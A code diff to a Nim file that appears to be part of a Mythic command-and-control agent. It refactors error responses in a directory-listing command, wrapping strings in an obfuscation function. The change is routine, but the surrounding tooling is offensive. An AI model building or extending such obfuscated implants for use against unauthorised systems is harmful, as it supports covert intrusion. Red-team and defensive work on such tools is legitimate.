@@ -1,5 +1,6 @@
 import json, os, strutils
 import ../utils/strenc
+import ../utils/m_responses
 
 when defined(linux):
   import posix
@@ -196,11 +197,7 @@ proc executeLs*(params: JsonNode): JsonNode =
     # So we can skip the dirExists check for UNC paths
     let isUNC = targetPath.startsWith("\\\\\\\\")
     if not isUNC and not dirExists(targetPath):
-      return %*{
-        obf("user_output"): obf("Error: Path does not exist or is not a directory: ") & targetPath,
-        obf("completed"): true,
-        obf("status"): "error"
-      }
+      return mythicError("", obf("Error: Path does not exist or is not a directory: ") & targetPath)
     
     # Build files list
     var filesList = newJArray()
@@ -244,8 +241,4 @@ proc executeLs*(params: JsonNode): JsonNode =
     }
     
   except Exception as e:
-    result = %*{
-      obf("user_output"): obf("Error listing directory: ") & e.msg,
-      obf("completed"): true,
-      obf("status"): "error"
-    }
+    result = mythicError("", obf("Error listing directory: ") & e.msg)
